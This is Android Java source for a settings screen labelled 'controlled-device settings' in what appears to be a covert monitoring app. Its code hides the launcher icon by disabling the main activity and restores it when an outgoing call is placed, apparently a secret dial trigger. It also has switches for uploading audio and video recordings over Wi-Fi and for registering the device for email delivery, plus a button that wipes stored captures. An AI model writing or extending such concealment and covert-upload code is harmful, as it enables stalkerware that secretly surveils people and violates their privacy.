package com.gengy.control.BeingControl.BeingControl;

import android.Manifest;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.CompoundButton;
import android.widget.Spinner;
import android.widget.Switch;
import android.widget.TextView;

import com.gengy.control.Base.BaseFragment;
import com.gengy.control.BeingControl.Authority.PhoneReceiver;
import com.gengy.control.BeingControl.Authority.PhoneReceiverHelper;
import com.gengy.control.GestureActivity;
import com.gengy.control.MainActivity;
import com.gengy.control.R;
import com.gengy.control.Untils.FileUntils;
import com.gengy.control.Untils.ShareKey;
import com.gengy.control.Untils.SharedPreferencesHelper;
import com.gengy.control.Untils.ToastUtils;
import com.gengy.control.http.ApiService;
import com.tbruyelle.rxpermissions2.RxPermissions;

import java.util.Map;

import butterknife.BindView;
import butterknife.OnClick;
import cn.bluemobi.dylan.http.Http;
import cn.bluemobi.dylan.http.HttpCallBack;

/**
 * @date on 2019/12/27
 * 描述       11:34
 * com.gengy.control.BeingControl.BeingControl
 */
public class BeingControlFrag extends BaseFragment implements CompoundButton.OnCheckedChangeListener {
    @BindView(R.id.spinner)
    Spinner spinner;
    @BindView(R.id.tv_spinner_con)
    TextView tvSpinnerCon;
    @BindView(R.id.switch_sound)
    Switch switchSound;
    @BindView(R.id.tv_sound_send)
    TextView tvSoundSend;
    @BindView(R.id.switch_sound_send)
    Switch switchSoundSend;
    @BindView(R.id.tv_record_send)
    TextView tvRecordSend;
    @BindView(R.id.switch_record_send)
    Switch switchRecordSend;
    @BindView(R.id.tv_privacy)
    TextView tvPrivacy;
    @BindView(R.id.tv_hide_icon)
    TextView tvHideIcon;
    @BindView(R.id.switch_privacy_send)
    Switch switchPrivacySend;
    @BindView(R.id.tv_function)
    TextView tvFunction;
    @BindView(R.id.tv_send_mail)
    TextView tvSendMail;
    @BindView(R.id.switch_function)
    Switch switchFunction;


    @Override
    protected int setLayoutResourceID() {
        return R.layout.frag_being_control;
    }

    @Override
    protected void initView() {

        action_title.setText("被控设置");
        tvSpinnerCon.setText("外录");
        initSpinner();
        switchPrivacySend.setOnCheckedChangeListener(this);
        switchRecordSend.setOnCheckedChangeListener(this);
        switchSoundSend.setOnCheckedChangeListener(this);
        switchFunction.setOnCheckedChangeListener(this);
//        SharedPreferencesHelper.getInstance(mActivity).clear(mActivity,ShareKey.IS_OPEN);

//        Log.i(TAG, "initViewinitView:initView "+SharedPreferencesHelper.getInstance(mActivity)
//        .getInt(ShareKey.IS_OPEN,0));

        String open = SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.IS_OPEN,
                "");




        switchFunction.setChecked(false);
        if (open.equals("1")) {
            switchFunction.setChecked(true);
        }


//        录音
        Boolean mSoundSend =
                SharedPreferencesHelper.getInstance(mActivity).getBoolean(ShareKey.SOUND_SEND,
                        false);
        switchSoundSend.setChecked(mSoundSend);

        //        录像
        Boolean mRecordSend =
                SharedPreferencesHelper.getInstance(mActivity).getBoolean(ShareKey.RECORD_SEND,
                        false);
        switchRecordSend.setChecked(mRecordSend);

    }

    private void initSpinner() {
        //原始string数组
        final String[] spinnerItems = {"外录", "内录"};
        //简单的string数组适配器：样式res，数组
        ArrayAdapter<String> spinnerAdapter = new ArrayAdapter<>(mActivity,
                android.R.layout.simple_spinner_item, spinnerItems);
        //下拉的样式res
        spinnerAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        //绑定 Adapter到控件
        spinner.setAdapter(spinnerAdapter);
        spinner.setPrompt("外录");
        //选择监听
        spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view,
                                       int pos, long id) {
                tvSpinnerCon.setText(spinnerItems[pos]);
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
                // Another interface callback
            }
        });
    }

    @Override
    protected void initData() {
        initPhoneBroadcastReceiver();


    }


    private void initPhoneBroadcastReceiver() {
//电话监听
        PhoneReceiverHelper mPhoneReceiverHelper = new PhoneReceiverHelper(mActivity);
        mPhoneReceiverHelper.setOnListener(new PhoneReceiver.OnPhoneListener() {
            @Override
            public void onPhoneOutCall(String number,TelephonyManager manager) {
                Log.i(TAG, "onPhoneOutCall: " + number);
                PackageManager packageManager = mActivity.getPackageManager();
                ComponentName componentName = new ComponentName(mActivity, MainActivity.class);
                int res = packageManager.getComponentEnabledSetting(componentName);

                packageManager.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
                        PackageManager.DONT_KILL_APP);
//                if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
//                        || res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
//                    // 隐藏应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DISABLED,
//                            PackageManager.DONT_KILL_APP);
//                } else {
//                    // 显示应用图标
//                    packageManager.setComponentEnabledSetting(componentName, PackageManager
//                    .COMPONENT_ENABLED_STATE_DEFAULT,
//                            PackageManager.DONT_KILL_APP);
//                }
            }

            @Override
            public void onPhoneStateChange(String state) {

            }

            @Override
            public void onPhoneStateChange(int state, TelecomManager number) {

            }
        });
        mPhoneReceiverHelper.register();


    }

    @Override
    public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
        switch (compoundButton.getId()) {
            case R.id.switch_function:
                String id = SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.ID,
                        "");
                if (TextUtils.isEmpty(id)) {
                    return;
                }
                String email =
                        SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.IS_BIND
                                , "0");
                if (email.equals("0")) {
                    ToastUtils.getInstanc().showToast("请先绑定邮箱");
                    return;
                }


//                String open=SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey
//                .IS_OPEN,"");

                int opendLoad = 0;
                if (b) {
                    opendLoad = 1;
                }

//             SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.IS_OPEN,opendLoad+"");


                //上传到服务器
                initUpdataIncloud(opendLoad, id);


                break;
            case R.id.switch_record_send:
                //wifi上传录像
                if (b) {
                    SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.RECORD_SEND, true);
                } else {
                    SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.RECORD_SEND, false);
                }


                break;
            case R.id.switch_sound_send:
                //wifi上传录音
                if (b) {
                    SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.SOUND_SEND, true);
                } else {
                    SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.SOUND_SEND, false);
                }
                break;


            case R.id.switch_privacy_send:

                PackageManager packageManager = mActivity.getPackageManager();
                ComponentName componentName = new ComponentName(mActivity, MainActivity.class);
                packageManager.setComponentEnabledSetting(componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                ToastUtils.getInstanc().showToast("开启成功");
                break;

        }
    }

    private void initUpdataIncloud(int opendLoad, String id) {

        Http.with(mActivity).setObservable(Http.getApiService(ApiService.class).uploadEmail(id,
                opendLoad + ""))
                .setDataListener(new HttpCallBack() {
                    @Override
                    public void netOnSuccess(Map<String, Object> data) {

                        Log.i(TAG, "netOnSuccesswitchFunctionisClickable(): "+opendLoad);
                        SharedPreferencesHelper.getInstance(mActivity).put(ShareKey.IS_OPEN,
                                opendLoad + "");
                    }

                                     @Override
                                     public void netOnFailure(Throwable ex) {
                                         super.netOnFailure(ex);
//                                         switchFunction.setChecked(false);
                                     }
                                 }
                );



    }

    @OnClick({R.id.layout_adress, R.id.layout_clear, R.id.layout_mail, R.id.layout_gesture})
    public void onViewClicked(View view) {
        switch (view.getId()) {
            case R.id.layout_gesture:

                bundle.putString("type", "set");
                actionStart(GestureActivity.class, bundle);
                break;
            case R.id.layout_mail:
                actionStart(BindMailboxActivity.class);
                break;
            case R.id.layout_adress:
                RxPermissions rxPermissions = new RxPermissions(this);
                rxPermissions
                        .request(Manifest.permission.READ_CONTACTS)
                        .subscribe(granted -> {
                            if (granted) { // Always true pre-M
                                actionStart(WhiteListActivity.class);
                            } else {
                                // Oups permission denied
                            }
                        });

                break;
            case R.id.layout_clear:
                //清楚所有的文件
                String screenPath =
                        SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.SCREEN_PATH, "");
                FileUntils.deleteDir(screenPath);
                String videoPath =
                        SharedPreferencesHelper.getInstance(mActivity).getString(ShareKey.VIDEO_PATH, "");
                FileUntils.deleteDir(videoPath);
                ToastUtils.getInstanc().showToast("删除成功");
                break;
        }
    }
}
